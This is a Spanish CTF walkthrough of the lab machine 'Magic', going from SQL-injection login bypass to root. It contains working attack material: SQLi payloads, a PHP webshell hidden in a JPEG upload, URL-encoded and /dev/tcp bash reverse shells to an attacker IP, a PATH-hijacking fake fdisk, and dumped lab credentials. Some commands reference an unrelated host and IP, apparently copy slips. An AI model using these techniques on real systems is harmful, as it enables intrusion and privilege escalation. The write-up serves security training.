# Magic

![](../../../../~gitbook/image.md)Publicado: 05 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Magic es una máquina Linux de dificultad media que presenta un portal web para un portfolio fotográfico con un panel de administración vulnerable. La explotación inicial se logra mediante una inyección SQL en el formulario de login, seguida de una subida de archivo maliciosa que permite la ejecución remota de comandos. Para el movimiento lateral, se aprovechan credenciales encontradas en archivos de configuración de la base de datos. La escalada de privilegios se consigue mediante un ataque de PATH hijacking en un binario SUID personalizado que ejecuta comandos del sistema sin especificar rutas absolutas.Técnicas utilizadas:- SQL Injection (UNION-based)
- File Upload Bypass
- Web Shell Upload
- Database Enumeration
- Credential Reuse
- PATH Hijacking
- SUID Binary Exploitation

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos TCP

####Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####80 HTTP
Enumeramos el servicio web para descubrir un sitio web para un portfolio que aloja imágenes como contenido desarrollado con Magic (https://github.com/once-ui-system/magic-portfolio). Hay un formulario de Login, aunque a priori no vemos ninguno de registro:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####Fuzzing de directorios
Tras probar a realizar fuzzing de directorios con dirsearch, gobuster y feroxbuster, no logramos enumerar nada que podamo usar como un potencial vector de ataque:
####💉 SQLi en Panel de login
Nos queda por analizar el panel de login y ver si es vulnerable a una posible inyección SQL.
Probando con credenciales por defecto de tipo admin:admin admin:Admin123 o admin:Password1 obtenemos una alerta de javascript indicando que las credenciales no son válidas:![](../../../../~gitbook/image.md)Sin embargo, si probamos a introducir un carácter ' para verificar una posible inyección sql, no obtenemos ningún error, lo cual nos hace pensar que algo está ocurriendo el backend a la hora de procesar la solicitud.Probamos con una SQLi de tipo unión usando el siguiente payload:Y tampoco obtenemos error, por lo que parece funcionar. Lo único que debemos es ajustar el número de columnas en el payload hasta encontrar el número correcto. que tenga la tabla. Probamos con 3 valores y bingo! estamos dentro!![](../../../../~gitbook/image.md)Hemos logrado acceder y tenemos acceso al módulo de carga de archivos. Analicemos qué tipo de extensiones están permitidas de cara a una posible subida de una webshell para explotar una RCE![](../../../../~gitbook/image.md)Una alerta javascript ya nos deja claro que solo se admiten archivos con las extensiones de imagen que se indican.
####📤 File Upload Bypass y RCE
Procedemos a crear una imagen dummy pero cuyo contenido sea válidoA continuación embebemos una php shell en la imagen que hemos creado anteriormenteVerificamos el tamaño y el mime type para asegurarnos de que cumpla con las condiciones necesarias para pasar los filtros de validación:Renombramos el archivoInterceptamos la petición con burp y cambiamos el nombre del archivo shell.jpg por shell.php.jpg![](../../../../~gitbook/image.md)Obtenemos un mensaje de que la imagen se ha subido correctamente.![](../../../../~gitbook/image.md)Ahora nos queda saber donde se ha almacenado la imagen. Revisando el código fuente del home de la aplicación vemos la ruta donde están almacenadas las imágenes que ya existen actualmente:![](../../../../~gitbook/image.md)Usamos esa ruta para referenciar nuestra imagen de la siguiente forma y probar la ejecución remota de comandos:![](../../../../~gitbook/image.md)Ahora, cambiamos el payload para tratar de ganar acceso a la máquina de Magic. En primer lugar iniciamos un listener:NOTA: Tuve que volver a subir la webshell ya que cada vez que ejecutaba un comando me borraba el archivo de la máquina.Ganamos acceso a la máquina Magic![](../../../../~gitbook/image.md)
####🔄 Movimiento Lateral
Encontramos un usuario llamado theseus en la máquina aunque no podemos leer la flag que se encuentra en su directorioContinuamos enumerando la máquina en busca de un potencial vector que nos permita realizar un movimiento lateral para ganar acceso como usuario theseus. Encontramos credenciales en el archivo `db.php5` del directorio `/var/www/Magic`![](../../../../~gitbook/image.md)En primer lugar comprobamos si theseus está reutilizando esta contraseña con su usuario del sistema pero verificamos que no.
####🗃️ Enumeración de Base de Datos
Vemos si hay una base de datos ejecutándose de forma local y podemos ganar acceso a ella:Tratamos de conectarnos a la base de datos y encontramos un problema, el cliente mysql no está instalado en la ḿaquina:Valoré la opción de usar chisel para realizar port forwading, pero se me ocurrió realizar una búsqueda en el sistema para ver qué opciones aparecían buscando mysql:Buscando información en la red, encontré que se puede usar mysqldump usando la siguiente sintaxis para realizar un dump de la base de datosObtenemos una nueva credencial `Th3s3usW4sK1ng`. Veamos si esta sí está siendo reutilizada por el usuario theseus, tal como parece indicar por el nombre.Ahora sí, logramos movernos lateralmente y ganar acceso como theseus y capturar la primera flag:
####🚀 Escalada a root
Comprobamos que theseus no puede ejecutar nada como root
####🔍 Enumeración de binarios SUID
Enumeramos binarios con permisos SUID:Entre los resultados, hay uno que no es habitual![](../../../../~gitbook/image.md)
####🛠️ Análisis del binario sysinfo
Ejecutar Sysinfo con Ltrace imprime las llamadas realizadas fuera del binario. La salida es enorme pero hay una línea que destaca:![](../../../../~gitbook/image.md)Popen es otra forma de abrir un proceso en Linux. El binario está haciendo una llamada a fdisk, lo cual está bien, excepto que lo está haciendo sin especificar la ruta completa. Esto deja al binario vulnerable a un ataque de PATH hijacking.
####🎯 PATH Hijacking
Creamos nuestro payload en /dev/shm (todo lo que hay en él se borra al reiniciar la máquina) con una bash shell one linerNOTA: importante darle permisos de ejecución al binario que usamos como payload.Ahora modificamos el path para que cuando el script busque la herramienta fdisk con la ruta de forma relativa encuentre en primer lugar lo que hay en /dev/shm y se ejecute primero:Iniciamos un listener con netcatLanzamos el binario /bin/sysinfo y ganamos acceso como root![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.185
PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=43.0 ms
64 bytes from 10.10.10.185: icmp_seq=2 ttl=63 time=43.2 ms

--- 10.10.10.185 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 42.970/43.109/43.249/0.139 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.185 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.10.185 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 18:16 CEST
Nmap scan report for 10.10.10.185
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds

```

```
echo "10.10.11.193 mentorquotes.htb" | sudo tee -a /etc/hosts
```

```
dirsearch -u http://10.10.10.185 -x 503
```

```
feroxbuster -u http://10.10.10.185 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
gobuster dir -e --url 10.10.11.11 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80
```

```
http://10.10.10.185/images/
http://10.10.10.185/assets/
http://10.10.10.185/assets/css/
http://10.10.10.185/assets/css/images/
http://10.10.10.185/assets/js/
http://10.10.10.185/images/uploads/
http://10.10.10.185/login.php
```

```
cn' UNION select 1,2,3,4-- -
```

```
cn' UNION select 1,2,3-- -
```

```
convert -size 100x100 xc:white test.jpg
```

```
echo "" >> test.jpg
```

```
file --mime-type test.jpg  # Debe decir "image/jpeg"
stat -c %s test.jpg
```

```
mv test.jpg shell.jpg
```

```
http://10.10.10.185/images/uploads/shell.php.jpg?cmd=id
```

```
nc -nlvp 443
```

```
http://10.10.10.185/images/uploads/shell.php.jpg?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%34%34%33%20%30%3e%26%31%27
```

```
www-data@magic:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Jul  6  2021 .
drwxr-xr-x 24 root    root    4096 Jul  6  2021 ..
drwxr-xr-x 15 theseus theseus 4096 Jul 12  2021 theseus
www-data@magic:/home$ cd theseus
www-data@magic:/home/theseus$ ls -la
total 80
drwxr-xr-x 15 theseus theseus 4096 Jul 12  2021 .
drwxr-xr-x  3 root    root    4096 Jul  6  2021 ..
-rw-------  1 theseus theseus  636 Jul 12  2021 .ICEauthority
lrwxrwxrwx  1 theseus theseus    9 Oct 21  2019 .bash_history -> /dev/null
-rw-r--r--  1 theseus theseus  220 Oct 15  2019 .bash_logout
-rw-r--r--  1 theseus theseus   15 Oct 21  2019 .bash_profile
-rw-r--r--  1 theseus theseus 3771 Oct 15  2019 .bashrc
drwxrwxr-x 13 theseus theseus 4096 Jul  6  2021 .cache
drwx------ 13 theseus theseus 4096 Jul  6  2021 .config
drwx------  3 theseus theseus 4096 Jul  6  2021 .gnupg
drwx------  3 theseus theseus 4096 Jul  6  2021 .local
drwx------  2 theseus theseus 4096 Jul  6  2021 .ssh
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Desktop
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Documents
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Downloads
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Music
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Pictures
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Public
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Templates
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Videos
-r--------  1 theseus theseus   33 Jun  5 09:13 user.txt
www-data@magic:/home/theseus$ cat user.txt
cat: user.txt: Permission denied
```

```
www-data@magic:/var/www/Magic$ su theseus
Password:
su: Authentication failure
www-data@magic:/var/www/Magic$
```

```
www-data@magic:/var/www/Magic$ ss -tulnp
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
udp    UNCONN   0        0                 0.0.0.0:68             0.0.0.0:*
udp    UNCONN   0        0                 0.0.0.0:631            0.0.0.0:*
udp    UNCONN   0        0                 0.0.0.0:5353           0.0.0.0:*
udp    UNCONN   0        0                 0.0.0.0:56610          0.0.0.0:*
udp    UNCONN   0        0                    [::]:39542             [::]:*
udp    UNCONN   0        0                    [::]:5353              [::]:*
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
tcp    LISTEN   0        5               127.0.0.1:631            0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN   0        128                  [::]:22                [::]:*
tcp    LISTEN   0        5                   [::1]:631               [::]:*
tcp    LISTEN   0        128                     *:80                   *:*
```

```
www-data@magic:/var/www/Magic$ mysql -u theseus -h localhost -p

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7
apt install mariadb-client-core-10.1
```

```
www-data@magic:/var/www/Magic$ mysql
mysql_config_editor        mysqld
mysql_embedded             mysqld_multi
mysql_install_db           mysqld_safe
mysql_plugin               mysqldump
mysql_secure_installation  mysqldumpslow
mysql_ssl_rsa_setup        mysqlimport
mysql_tzinfo_to_sql        mysqloptimize
mysql_upgrade              mysqlpump
mysqladmin                 mysqlrepair
mysqlanalyze               mysqlreport
mysqlbinlog                mysqlshow
mysqlcheck                 mysqlslap
```

```
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

```
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
`id` int(6) NOT NULL AUTO_INCREMENT,
`username` varchar(50) NOT NULL,
`password` varchar(100) NOT NULL,
PRIMARY KEY (`id`),
UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-06-05 10:25:45
```

```
www-data@magic:/var/www/Magic$ su theseus
Password:
theseus@magic:/var/www/Magic$ whoami
theseus
theseus@magic:/var/www/Magic$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
theseus@magic:/var/www/Magic$
```

```
theseus@magic:~$ sudo -l
[sudo] password for theseus:
Sorry, user theseus may not run sudo on magic.
theseus@magic:~$
```

```
find / -perm -4000 -user root 2>/dev/null
```

```
cd /dev/shm
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.3/443 0>&1' > fdisk
```

```
theseus@magic:/dev/shm$ cat fdisk
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
theseus@magic:/dev/shm$
theseus@magic:/dev/shm$ chmod +x fdisk
theseus@magic:/dev/shm$ ls
fdisk
```

```
theseus@magic:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@magic:/dev/shm$ export PATH=/dev/shm:$PATH
theseus@magic:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```
nc -nlvp 443
```
